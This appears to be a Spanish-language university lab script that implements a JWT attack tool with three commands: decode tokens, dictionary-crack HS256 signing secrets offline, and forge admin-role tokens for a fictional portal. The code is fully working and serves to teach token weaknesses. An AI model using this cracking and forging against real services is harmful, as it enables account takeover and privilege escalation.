#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Fernando Boiero — CyberLab UTN FRVM
"""
jwt_tool.py — Lab Extra 5. Tu navaja para JWT. Solo biblioteca estándar.

Conseguiste un token del portal de PhantomCorp (login con las credenciales
públicas de demo). Con esta herramienta vas a: decodificarlo, crackear el
secreto de firma con un diccionario, y forjar tokens propios.

La herramienta usa solo la biblioteca estándar y conserva las firmas y la CLI.
`b64url_dec()` y `b64url()` codifican y decodifican segmentos base64url.

Uso:
  python3 jwt_tool.py decodificar <token>
  python3 jwt_tool.py crackear <token> caso/diccionario.txt
  python3 jwt_tool.py forjar <secreto> --sub diego --role admin
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import time


# ---------------------------------------------------------------------------
# REFERENCIA (ya implementada). Todo JWT es base64url + una firma.
# ---------------------------------------------------------------------------
def b64url_dec(texto: str) -> bytes:
    """base64url SIN padding: hay que rellenar con '=' antes de decodificar.
    Esto es todo lo que "protege" el payload de un JWT: nada."""
    pad = "=" * (-len(texto) % 4)
    return base64.urlsafe_b64decode(texto + pad)


def b64url(datos: bytes) -> str:
    return base64.urlsafe_b64encode(datos).rstrip(b"=").decode()


def decodificar(token: str) -> tuple:
    """Devuelve (header, payload, firma_hex) SIN verificar nada.
    Pista: el token tiene 3 partes separadas por '.'; decodificá las dos
    primeras con b64url_dec + json.loads. La firma NO se json-parsea."""
    if not isinstance(token, str):
        raise ValueError("El token debe ser texto")
    partes = token.split(".")
    if len(partes) != 3:
        raise ValueError("Un JWT debe tener tres segmentos")

    cabecera_b64, payload_b64, firma_b64 = partes
    alfabeto = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
    if not cabecera_b64 or not payload_b64:
        raise ValueError("La cabecera y el payload no pueden estar vacíos")
    if any(c not in alfabeto for c in cabecera_b64 + payload_b64 + firma_b64):
        raise ValueError("El JWT contiene caracteres fuera de base64url")

    try:
        header = json.loads(b64url_dec(cabecera_b64).decode("utf-8"))
        payload = json.loads(b64url_dec(payload_b64).decode("utf-8"))
        firma_hex = b64url_dec(firma_b64).hex()
    except (ValueError, TypeError, UnicodeError) as exc:
        raise ValueError("La cabecera, el payload o la firma no tienen formato válido") from exc

    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise ValueError("La cabecera y el payload JSON deben ser objetos")
    return header, payload, firma_hex


def firma_es_valida(token: str, secreto: bytes) -> bool:
    """Recalculá HMAC-SHA256(secreto, "cabecera.payload") y comparalo con la
    firma del token (en tiempo constante: hmac.compare_digest).
    ESTO es lo único que un atacante necesita para probar candidatos OFFLINE:
    no hay rate limit, no hay logs, no hay lockout. El token ES el oráculo."""
    if not isinstance(token, str) or not isinstance(secreto, bytes):
        return False
    partes = token.split(".")
    if len(partes) != 3:
        return False

    cabecera_b64, payload_b64, firma_b64 = partes
    alfabeto = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
    if (not cabecera_b64 or not payload_b64
            or any(c not in alfabeto for c in cabecera_b64 + payload_b64 + firma_b64)):
        return False

    try:
        header = json.loads(b64url_dec(cabecera_b64).decode("utf-8"))
        if not isinstance(header, dict) or header.get("alg") != "HS256":
            return False
        firma = b64url_dec(firma_b64)
        mensaje = f"{cabecera_b64}.{payload_b64}".encode("ascii")
        esperada = hmac.new(secreto, mensaje, hashlib.sha256).digest()
    except (ValueError, TypeError, UnicodeError):
        return False

    return hmac.compare_digest(esperada, firma)


def crackear_secreto(token: str, diccionario: str) -> str:
    """Probá cada palabra del diccionario como secreto hasta que
    firma_es_valida() dé True. Devolvé el secreto encontrado.
    (Si querés, aplicá reglas como en el Lab Extra 4: año, 123, mayúscula.)"""
    try:
        with open(diccionario, "r", encoding="utf-8-sig") as archivo:
            for linea in archivo:
                candidato = linea.strip()
                if not candidato or candidato.startswith("#"):
                    continue
                if firma_es_valida(token, candidato.encode("utf-8")):
                    return candidato
    except (OSError, UnicodeError):
        return ""
    return ""


def forjar(secreto: bytes, sub: str, role: str) -> str:
    """Firmá un token propio: header {"alg":"HS256","typ":"JWT"}, payload con
    sub/role/iat/exp (exp = ahora + 1 hora). Devolvé "cab.pay.firma".
    Cuando esto funciona, el servidor ya no distingue tu token de uno real."""
    ahora = int(time.time())
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": sub, "role": role, "iat": ahora, "exp": ahora + 3600}

    cabecera_b64 = b64url(json.dumps(header, separators=(",", ":"), ensure_ascii=False).encode("utf-8"))
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8"))
    mensaje = f"{cabecera_b64}.{payload_b64}".encode("ascii")
    firma = hmac.new(secreto, mensaje, hashlib.sha256).digest()
    return f"{cabecera_b64}.{payload_b64}.{b64url(firma)}"


def main() -> int:
    ap = argparse.ArgumentParser(description="jwt_tool — Lab Extra 5")
    sub = ap.add_subparsers(dest="cmd", required=True)
    d = sub.add_parser("decodificar", help="leer header/payload (sin verificar)")
    d.add_argument("token")
    c = sub.add_parser("crackear", help="crackear el secreto con diccionario")
    c.add_argument("token")
    c.add_argument("diccionario")
    f = sub.add_parser("forjar", help="firmar un token propio con el secreto")
    f.add_argument("secreto")
    f.add_argument("--sub", default="diego")
    f.add_argument("--role", default="admin")
    args = ap.parse_args()

    if args.cmd == "decodificar":
        header, payload, firma = decodificar(args.token)
        print("HEADER: ", json.dumps(header, indent=2))
        print("PAYLOAD:", json.dumps(payload, indent=2))
        print("FIRMA:  ", firma[:32] + "…")
    elif args.cmd == "crackear":
        secreto = crackear_secreto(args.token, args.diccionario)
        print(f"SECRETO: {secreto}" if secreto else "No cayó con ese diccionario.")
    else:
        print(forjar(args.secreto.encode(), args.sub, args.role))
    return 0


if __name__ == "__main__":
    sys.exit(main())
